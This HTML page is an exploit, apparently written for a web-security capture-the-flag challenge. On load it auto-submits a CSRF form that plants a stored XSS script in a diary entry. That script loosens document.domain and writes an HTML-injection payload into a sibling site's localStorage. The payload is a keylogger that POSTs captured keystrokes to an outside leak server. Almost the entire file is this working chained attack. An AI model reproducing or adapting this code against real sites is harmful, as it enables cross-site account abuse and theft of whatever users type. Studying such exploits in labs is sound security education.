<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <title>Leak Endpoint</title>
    </head>

    <body>

    <form id="feeling" action="https://diary.owley-madison.jeopardy.websec.saarland/entry" method="POST">
        <div class="form-group">
            <label for="feelings">Tell me about your Feelings:</label>
            <textarea class="form-control" id="feelings" name="content" rows="3">
                <script>

                    console.log('OwleyPwn: Bootstrapping exploit through CSRF entry point!');
                    console.log('OwleyPwn: Running included script through XSS vulnerability.');

                    console.log('OwleyPwn: Setting domain for cross-domain script execution...');
                    document.domain = "owley-madison.jeopardy.websec.saarland";

                    console.log('OwleyPwn: Creating iFrame to match page...');
                    let matchFrame = document.createElement('iframe');
                    matchFrame.src = 'https://match.owley-madison.jeopardy.websec.saarland/';
                    document.body.appendChild(matchFrame);

                    console.log('OwleyPwn: Waiting for frame to load in order to poison local storage...');
                    matchFrame.onload = function() {

                        console.log('OwleyPwn: Frame loaded, now injecting payload into local storage...');
                        let payload = '</option></select><img src="null" onerror="' +
                            'console.log(\'OwleyPwn: Exploit now running in message scope!\');' +
                            'console.log(\'OwleyPwn: Hooking to window.onkeydown to catch keystrokes...\');' +
                            'window.keybuffer=\'\';' +
                            'window.onkeydown=function(e){' +
                            'console.log(e);' +
                            'window.keybuffer+=e.key;' +
                            'if (e.key===\'}\'){' +
                            'console.log(\'OwleyPwn: Found flag, leaking to server...\');' +
                            'let xhr=new XMLHttpRequest();' +
                            'xhr.open(\'POST\',\'https://gameserver.websec.saarland/leak\',false);' +
                            'xhr.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');' +
                            'xhr.send(\'secret=deaddeaddeaddeaddeaddeaddeaddead&data=\'+window.keybuffer);' +
                            '}' +
                            '};' +
                            '" />';
                        let payloadJson = JSON.stringify([payload]);
                        matchFrame.contentWindow.localStorage.setItem('favorites', payloadJson);

                        console.log('OwleyPwn: Exploit successfully bootstrapped!');
                        console.log('OwleyPwn: Now redirecting to messages page...');
                        document.location = 'https://chat.owley-madison.jeopardy.websec.saarland/';

                    };

                </script>
            </textarea>
        </div>
    </form>

    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
    <script>
        let exploit = document.getElementById('feeling');
        exploit.submit();
    </script>

    </body>

</html>
